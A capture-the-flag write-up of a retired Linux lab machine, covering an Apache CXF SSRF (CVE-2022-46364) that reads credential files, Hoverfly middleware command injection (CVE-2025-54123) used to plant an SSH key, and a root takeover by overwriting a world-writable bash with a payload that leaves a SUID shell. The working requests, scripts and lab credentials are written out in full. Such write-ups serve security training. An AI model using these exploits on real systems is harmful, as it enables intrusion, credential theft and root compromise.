# DevArea

![OS](https://img.shields.io/badge/OS-Linux-333333?style=flat-square&logo=linux&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square) ![Released](https://img.shields.io/badge/Released-2026--03--28-informational?style=flat-square)

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Medium |
| **Release** | March 28, 2026 |
| **Rating** | 3.4 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

DevArea is a Medium Linux box featuring a multi-stage chain through developer tools. Anonymous FTP exposes a Java JAR revealing an Apache CXF 3.2.14 SOAP service vulnerable to CVE-2022-46364 (MTOM XOP:Include SSRF/LFI). The SSRF reads the Hoverfly systemd service file containing plaintext credentials. Authenticating to the Hoverfly API enables CVE-2025-54123 (middleware command injection) for RCE as dev_ryan. Privilege escalation exploits a world-writable `/usr/bin/bash` binary: replace bash with a malicious script from `/bin/dash`, then trigger `sudo /opt/syswatch/syswatch.sh` which executes the hijacked bash as root.

---

## Recon

### Port Scan
```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5 (anonymous login allowed)
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.58 (static site, redirects to devarea.htb)
8080/tcp open  http    Jetty 9.4.27.v20200227 (Apache CXF SOAP service)
8500/tcp open  http    Golang net/http (Hoverfly proxy, requires auth: 407)
8888/tcp open  http    Golang net/http (Hoverfly Dashboard, requires auth)
```

### Fingerprint Engine Results
- Web Fingerprint Engine: Jetty 9.4.27 matched (old version, check for CXF CVEs)
- Hoverfly Dashboard identified on port 8888 (niche dev tool — EmSec pattern)
- No vhosts found (ffuf subdomain fuzz returned nothing)

### Service Enumeration

**FTP (21)**: Anonymous login allowed. `/pub/` directory contains `employee-service.jar` (6.2 MB).

**Port 80**: Static "DevArea - Connect with Top Development Talent" hiring platform. No dynamic functionality.

**Port 8080**: Jetty 9.4.27 serving Apache CXF 3.2.14 SOAP web service. WSDL at `/employeeservice?wsdl`. Single operation: `submitReport` accepting `employeeName`, `department`, `content`, `confidential` fields.

**Port 8500**: Hoverfly v1.11.3 proxy server. Returns 407 Proxy Authentication Required.

**Port 8888**: Hoverfly v1.11.3 admin dashboard. All API endpoints return 401 Unauthorized without credentials.

### JAR Analysis (employee-service.jar)
```bash
# Extract and analyze
mkdir /tmp/jar-analysis && cd /tmp/jar-analysis && jar xf employee-service.jar
```
- Apache CXF 3.2.14 (2019) + Jetty 9.4.27 (Feb 2020)
- Namespace: `htb.devarea`
- Classes: `ServerStarter`, `EmployeeService`, `EmployeeServiceImpl`, `Report`
- Binds to `0.0.0.0:8080`
- No input validation, string concatenation in response
- XXE blocked (DTD parsing disabled)

---

## Foothold — CVE-2022-46364 (Apache CXF MTOM XOP:Include SSRF)

### Vulnerability
- **Type**: SSRF / Arbitrary File Read via MTOM XOP:Include
- **CVE**: CVE-2022-46364 (CVSS 9.8)
- **Service**: Apache CXF 3.2.14 on Jetty 9.4.27
- **Discovery**: JAR analysis revealed exact CXF version → searchsploit + CVE research

### Exploitation
The `submitReport` SOAP operation accepts MTOM (Message Transmission Optimization Mechanism) requests. The XOP:Include `href` attribute allows fetching arbitrary `file://` and `http://` URIs, and the content is returned base64-encoded in the SOAP response.

```bash
# Read /etc/passwd via MTOM XOP:Include
curl -s -X POST http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<r>"; start-info="text/xml"; boundary="--B"' \
  -d '----B
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-ID: <r>

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:emp="http://devarea.htb/">
  <soap:Body>
    <emp:submitReport>
      <arg0>
        <employeeName>x</employeeName>
        <department>x</department>
        <content><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></content>
        <confidential>false</confidential>
      </arg0>
    </emp:submitReport>
  </soap:Body>
</soap:Envelope>

----B--'
# Base64-encoded file content returned in <return> element
```

### Key File: Hoverfly Service Credentials
```bash
# Read /etc/systemd/system/hoverfly.service
# Reveals: ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU
```

| Setting | Value |
|---------|-------|
| Username | admin |
| Password | O7IJ27MyyXiU |
| Working Dir | /opt/HoverFly |
| User | dev_ryan |

### Other Key Files Read
- `/etc/systemd/system/employee-service.service` — reveals `InaccessiblePaths=/home/dev_ryan/user.txt` (can't read flag via SSRF)
- `/proc/self/environ` — confirms CXF runs as `dev_ryan`, `JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64`
- `/etc/syswatch.env` — Flask secret key, admin password, DB path, plugin/log/backup directories
- `/etc/apache2/sites-enabled/devarea.conf` — static site config

---

## User Flag — CVE-2025-54123 (Hoverfly Middleware RCE)

### Hoverfly Authentication
```bash
# Get JWT token
TOKEN=$(curl -s -X POST http://devarea.htb:8888/api/token-auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"O7IJ27MyyXiU"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Verify: Hoverfly v1.11.3 (vulnerable to CVE-2025-54123)
curl -s -H "Authorization: Bearer $TOKEN" http://devarea.htb:8888/api/v2/hoverfly
# Returns: {"version":"v1.11.3", ...}
```

Note: Basic auth does NOT work. Must use token auth via `/api/token-auth` endpoint.

### Vulnerability
- **Type**: Command Injection via Middleware (RCE)
- **CVE**: CVE-2025-54123 (CVSS 9.8)
- **Advisory**: GHSA-r4h8-hfp2-ggmf
- **Service**: Hoverfly v1.11.3
- **Root Cause**: `local_middleware.go` executes user-supplied `binary` and `script` fields without sanitization

### Exploitation — SSH Key Injection
```bash
# Set middleware that injects SSH key (executes immediately as validation test)
curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"binary\":\"bash\",\"script\":\"#!/bin/bash\nmkdir -p /home/dev_ryan/.ssh && echo 'SSH_PUBKEY' >> /home/dev_ryan/.ssh/authorized_keys && chmod 700 /home/dev_ryan/.ssh && chmod 600 /home/dev_ryan/.ssh/authorized_keys\"}"

# SSH as dev_ryan
ssh -i htb_key dev_ryan@devarea.htb
```

The middleware script executes immediately during Hoverfly's validation test — no need to trigger proxy requests.

### User Flag
```bash
dev_ryan@devarea:~$ cat ~/user.txt
```
```
[flag redacted]
```

---

## Privilege Escalation — World-Writable Bash Hijack

### Enumeration
```bash
dev_ryan@devarea:~$ sudo -l
# (root) NOPASSWD: /opt/syswatch/syswatch.sh
# !/opt/syswatch/syswatch.sh web-stop
# !/opt/syswatch/syswatch.sh web-restart

dev_ryan@devarea:~$ ls -la /usr/bin/bash
-rwxrwxrwx 1 root root 1446024 Mar 31  2024 /usr/bin/bash
# ^^^ WORLD-WRITABLE — this is the privesc
```

### SysWatch Infrastructure (enumerated but NOT the privesc vector)
- SysWatch script at `/opt/syswatch/syswatch.sh` — runs plugins, manages web GUI, views logs
- Web GUI on port 7777 (Flask app, runs as `syswatch` user)
- Timer `syswatch-monitor.timer` runs `/opt/syswatch/monitor.sh` as root every 5 minutes
- Plugin/log path traversal and command injection all blocked
- ACL `user:dev_ryan:---` on `/opt/syswatch/` blocks all direct reads as dev_ryan
- Flask secret key found but forged cookies only access dashboard (no admin write capabilities found)

### Vulnerability
- **Type**: World-writable system binary (`/usr/bin/bash` has `rwxrwxrwx` permissions)
- **Discovery**: `ls -la /usr/bin/bash` during standard enumeration

### Exploitation — Bash Replacement via /bin/dash

The sudo rule runs `/opt/syswatch/syswatch.sh` as root. The script's shebang is `#!/bin/bash`. By replacing `/usr/bin/bash` with a malicious script, any `sudo` execution of syswatch.sh invokes our payload as root.

**Critical**: Must use `/bin/dash` for the entire operation, and `killall -9 bash` must clear the "text file busy" lock before writing.

```bash
# All commands via /bin/dash (NOT bash)
ssh dev_ryan@devarea.htb /bin/dash << 'EOF'
# Step 1: Backup real bash
/bin/cp /usr/bin/bash /tmp/bash.bak

# Step 2: Kill all bash processes (releases "text file busy" lock)
/usr/bin/killall -9 bash 2>/dev/null
/bin/sleep 1
/usr/bin/killall -9 bash 2>/dev/null

# Step 3: Replace bash with payload script
/usr/bin/printf '#!/tmp/bash.bak\ncat /root/root.txt > /tmp/root.txt\nchmod 777 /tmp/root.txt\ncp /tmp/bash.bak /usr/bin/bash\ncp /tmp/bash.bak /tmp/rootbash\nchmod +s /tmp/rootbash\nexec /tmp/bash.bak "$@"\n' > /usr/bin/bash

# Step 4: Trigger — sudo runs syswatch.sh which calls /bin/bash (our payload) as root
/usr/bin/sudo /opt/syswatch/syswatch.sh --version

# Step 5: Read root flag (written to /tmp by our payload)
/bin/cat /tmp/root.txt
EOF
```

The payload script:
1. Reads `/root/root.txt` → `/tmp/root.txt` (using root privileges from sudo)
2. Restores real bash from backup
3. Creates SUID bash copy at `/tmp/rootbash` for persistent root access
4. Executes real bash to actually run syswatch.sh (so sudo doesn't error)

---

## Root Flag
```
[flag redacted]
```

---

## Attack Chain Summary
```
FTP anon (employee-service.jar) → Apache CXF 3.2.14 CVE-2022-46364 MTOM SSRF
→ Read Hoverfly service file (creds: admin/O7IJ27MyyXiU)
→ Hoverfly v1.11.3 CVE-2025-54123 middleware RCE → SSH key inject → dev_ryan
→ /usr/bin/bash world-writable → bash hijack via /bin/dash → sudo syswatch.sh → root
```

## Credentials Found
| Service | Username | Password | Source |
|---------|----------|----------|--------|
| Hoverfly API | admin | O7IJ27MyyXiU | `/etc/systemd/system/hoverfly.service` via SSRF |
| SysWatch Web | admin | SyswatchAdmin2026 | `/etc/syswatch.env` via SSRF (did NOT work for login) |
| Flask Secret | — | f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725 | `/etc/syswatch.env` via SSRF |

## Tools Used
- rustscan / nmap: Port discovery + service fingerprinting
- ffuf: Vhost fuzzing (no results)
- curl: SOAP requests, MTOM SSRF exploitation, Hoverfly API interaction
- jar / jadx: JAR decompilation and analysis
- searchsploit: CVE lookup for Apache CXF, Hoverfly, Jetty, vsftpd
- flask-unsign: Flask session cookie forging (for syswatch web GUI access)
- python3 requests: Hoverfly middleware payload delivery
- /bin/dash: Bash replacement (critical for privesc)

---

## Lessons Learned & Post-Mortem

### What Worked Well
- **CVE discovery was fast**: Identified CXF 3.2.14 → CVE-2022-46364 within minutes of JAR analysis
- **MTOM SSRF exploitation was clean**: First attempt worked, immediately read /etc/passwd
- **Parallel CVE search**: Launched agents for all services simultaneously, found Hoverfly CVEs quickly
- **Hoverfly middleware RCE**: SSH key injection via middleware was reliable

### What Wasted Time (~35 minutes lost)

1. **Anchored on syswatch.sh privesc analysis for too long (~20 min)**
   - Spent excessive time trying to read the syswatch.sh script (blocked by ACL)
   - Tried path traversal, plugin injection, log injection — all properly filtered
   - Forged Flask session cookies and explored the syswatch web GUI
   - The actual privesc (world-writable bash) was discoverable with a simple `ls -la /usr/bin/bash`

2. **Bash hijack execution failures (~15 min)**
   - First attempt: forgot to kill bash processes → "Text file busy" error
   - Second attempt: `/tmp/bash.bak` got corrupted/emptied → broke bash entirely
   - Had to RESET the machine and redo everything
   - Third attempt succeeded: proper `killall -9 bash` + `sleep 1` before write

3. **SSH login shell dependency**
   - SSH uses `/bin/bash` as login shell — once bash was corrupted, SSH stopped working
   - Could only recover through Hoverfly middleware (which uses Go binary, not bash)
   - Hoverfly middleware `cp` commands failed silently — "text file busy" on the corrupted bash
   - Full machine reset was the only reliable recovery

### Key Takeaways

1. **CHECK FILE PERMISSIONS ON SYSTEM BINARIES IMMEDIATELY**
   `/usr/bin/bash` being world-writable is a trivial finding that `ls -la /usr/bin/bash` reveals in 1 second. We missed it because we went straight to analyzing the complex syswatch.sh sudo rule. The fast solvers (7 min user, 20 min root) probably checked this immediately.

2. **Bash hijack requires /bin/dash safety net**
   Any operation that modifies `/usr/bin/bash` MUST be done entirely from `/bin/dash`. One wrong step and you lose SSH access, requiring a machine reset. The correct order is:
   - Switch to `/bin/dash`
   - Backup bash to `/tmp/bash.bak`
   - `killall -9 bash` (MUST wait for file lock release)
   - Write hijack script
   - Trigger via sudo
   - Read flag

3. **EmSec pattern confirmed: multi-CVE chain + niche software**
   Exactly as predicted: Apache CXF (niche SOAP framework) + Hoverfly (niche API simulation tool). Two CVEs chained for user, world-writable binary for root. EmSec's Linux boxes consistently use uncommon software with real CVEs.

4. **Hoverfly middleware executes at SET time**
   The middleware validation test runs the script immediately when you PUT to `/api/v2/hoverfly/middleware`. No need to trigger proxy requests. This is a feature of CVE-2025-54123 — the validation itself is the exploit vector.

5. **Don't reset machines unless absolutely necessary**
   The reset cost us ~5 minutes of downtime plus re-exploitation time. Better approach: always backup bash to MULTIPLE locations (`/tmp/bash.bak`, `/var/tmp/bash.bak`, `/home/dev_ryan/bash.bak`) before any modification.

---

## Dead Ends
- **XXE on CXF SOAP**: DTD parsing disabled, error: "Received event DTD"
- **Hoverfly CVE-2024-45388 path traversal**: Blocked — "relative path is invalid as it attempts to backtrack"
- **Hoverfly CVE-2025-54376 WebSocket leak**: Connected but no logs streamed
- **Hoverfly proxy auth bypass via SSRF to localhost**: Returns empty — auth enforced regardless of source
- **SSH with Hoverfly password**: `O7IJ27MyyXiU` denied for SSH (password auth disabled or different password)
- **SysWatch plugin command injection**: Plugin names validated (alphanumeric only), args produce no visible output
- **SysWatch log path traversal**: `../` filtered, returns "Invalid log filename"
- **SysWatch web GUI download path traversal**: Double-encoding reaches files but returns "Forbidden" (extension whitelist)
- **SysWatch web GUI login**: `SyswatchAdmin2026` password from env file doesn't work (hash mismatch or different auth)
- **Flask session forging**: Cookie `{"user_id": 1}` accesses dashboard but no admin write capabilities found

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
